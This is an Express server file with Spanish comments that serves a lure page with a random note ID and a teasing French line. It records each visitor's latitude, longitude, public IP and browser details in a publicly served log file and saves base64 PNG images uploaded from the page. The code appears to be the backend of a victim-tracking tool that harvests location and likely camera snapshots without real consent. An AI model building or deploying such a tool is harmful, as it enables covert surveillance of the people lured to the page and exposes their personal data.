const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// Middleware para archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Parseo de JSON y formularios
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Configuración de EJS como motor de vistas
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Directorios de almacenamiento
const uploadsDir = path.join(__dirname, 'public', 'uploads');
const imagesDir = path.join(uploadsDir, 'images');

// Crear directorios si no existen
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
    console.log("Directorio 'uploads' creado.");
}

if (!fs.existsSync(imagesDir)) {
    fs.mkdirSync(imagesDir, { recursive: true });
    console.log("Directorio 'images' creado.");
}

// Verificar permisos de escritura
fs.access(imagesDir, fs.constants.W_OK, (err) => {
    if (err) {
        console.error(`Sin acceso de escritura al directorio: ${imagesDir}`);
    } else {
        console.log(`Permisos de escritura confirmados para: ${imagesDir}`);
    }
});

// Archivo de prueba para verificar escritura
const testFilePath = path.join(imagesDir, 'test.txt');
fs.writeFile(testFilePath, 'Test content', (err) => {
    if (err) {
        console.error(`Error al escribir en: ${imagesDir}`);
    } else {
        console.log(`Archivo de prueba escrito en: ${imagesDir}`);
    }
});

// Listar imágenes al iniciar el servidor
const initialImageFiles = fs.readdirSync(imagesDir);
console.log("Imágenes en el directorio al iniciar:", initialImageFiles);

// Generar IDs aleatorios
function generateNoteId() {
    return Math.random().toString(36).substring(2, 10);
}

// Endpoint para renderizar la vista inicial
app.get('/', (req, res) => {
    const noteId = generateNoteId();
    const noteContent = "Dis moi, tu saurais p?";
    res.render('index2', { noteId, noteContent });
});

// Endpoint para guardar datos del cliente
app.post('/log-client-data', (req, res) => {
    const { latitude, longitude, publicIP, browserInfo } = req.body;

    if (!latitude || !longitude || !publicIP || !browserInfo) {
        return res.status(400).json({ message: 'Datos inválidos' });
    }

    const logEntry = `
Timestamp: ${new Date().toISOString()}
IP: ${publicIP}
Location: (${latitude}, ${longitude})
Browser Info: ${JSON.stringify(browserInfo, null, 2)}
`;
    const logFilePath = path.join(__dirname, 'public', 'uploads', 'log.txt');
    fs.appendFile(logFilePath, logEntry, (err) => {
        if (err) {
            console.error('Error al escribir en el archivo de registro:', err);
            return res.status(500).json({ message: 'Error al registrar datos' });
        }
        res.json({ message: 'Datos registrados correctamente' });
    });
});

// Endpoint para guardar imágenes
app.post('/save-image', (req, res) => {
    const { imageData } = req.body;

    if (!imageData) {
        return res.status(400).json({ message: 'No se proporcionaron datos de la imagen' });
    }

    const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
    const filename = `image-${Date.now()}.png`;
    const filePath = path.join(imagesDir, filename);

    fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (err) {
            console.error('Error al guardar la imagen:', err);
            return res.status(500).json({ message: 'Error al guardar la imagen' });
        }

        console.log("Imagen guardada:", filename);

        // Listar archivos actuales después de guardar
        const currentImageFiles = fs.readdirSync(imagesDir);
        console.log("Imágenes actuales en el directorio:", currentImageFiles);

        res.json({ message: 'Imagen guardada exitosamente', filename });
    });
});

// Iniciar servidor
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor ejecutándose en http://localhost:${PORT}`);
});

